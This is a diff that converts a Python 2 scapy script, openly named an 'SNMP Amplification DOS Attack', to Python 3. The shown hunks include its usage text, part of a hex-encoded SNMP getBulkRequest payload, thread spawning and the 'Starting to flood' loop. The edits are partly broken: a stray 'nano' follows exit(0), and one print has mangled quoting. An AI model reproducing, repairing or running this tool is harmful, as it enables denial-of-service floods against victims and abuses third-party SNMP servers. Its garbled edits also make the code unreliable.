@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 from scapy.all import *
 import sys
 import threading
@@ -20,12 +20,12 @@ def deny():
 
 #So I dont have to have the same stuff twice
 def printhelp():
-	print "SNMP Amplification DOS Attack"
-	print "Usage snmpdos.py <target ip> <snmpserver list> <number of threads>"
-	print "ex: ex: snmpdos.py 1.2.3.4 file.txt 10"
-	print "SNMP serverlist file should contain one IP per line"
-	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
-	exit(0)
+	print(' SNMP Amplification DOS Attack ')
+	print(' Usage snmpdos.py <IP> <snmpserver list> <threads> ')
+	print(' ex: ex: snmpdos.py 1.2.3.4 file.txt 10 ')
+	print(' SNMP serverlist file should contain one IP per line')
+	print(' MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS ')
+	exit(0)nano
 
 if len(sys.argv) < 4:
 	printhelp()
@@ -46,8 +46,8 @@ with open(snmpserverfile) as f:
 
 #Make sure we dont out of bounds
 if  numberthreads > int(len(snmplist)):
-	print "Attack Aborted: More threads than servers"
-	print "Next time dont create more threads than servers"
+	print(' Attack Aborted: More threads than servers ')
+	print(' Next time dont create more threads than servers ')
 	exit(0)
 
 #Magic Packet getBulkEequest
@@ -59,8 +59,8 @@ data += "\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0
 
 #Hold our threads
 threads = []
-print "Starting to flood: "+ target + " using snmp list: " + snmpserverfile + " With " + str(numberthreads) + " threads"
-print "Use CTRL+C to stop attack"
+print('Starting to flood: "+ target + " using snmp list: " + snmpserverfile + " With " + str(numberthreads) + "threads" ')
+print('Use CTRL+C to stop attack ')
 
 #Thread spawner
 for n in range(numberthreads):
@@ -71,7 +71,7 @@ for n in range(numberthreads):
     threads.append(thread)
 
 #In progress!
-print "Sending..."
+print('Sending... ')
 
 #Keep alive so ctrl+c still kills all them threads
 while True:
